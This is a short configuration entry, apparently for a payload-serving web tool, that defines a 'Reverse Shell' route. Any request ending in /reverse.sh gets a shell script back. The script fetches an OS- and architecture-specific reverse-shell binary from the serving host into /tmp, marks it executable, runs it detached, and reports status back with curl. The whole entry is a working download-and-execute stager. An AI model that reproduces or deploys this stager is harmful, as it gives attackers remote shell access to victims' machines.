---
title: Reverse Shell
description: Requires bind-shell in static dir
weight: 1
pattern: /reverse.sh$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    OS=$(uname)
    ARCH=$(uname -m)
    curl {{.Request.Host}}/mdaas/$OS/$ARCH/reverse-shell > /tmp/rs
    chmod +x /tmp/rs
    curl -d "$(bash -c "/tmp/rs & disown 2>&1" & )"  {{.Request.Host}}/l/status/reverse-shell
---
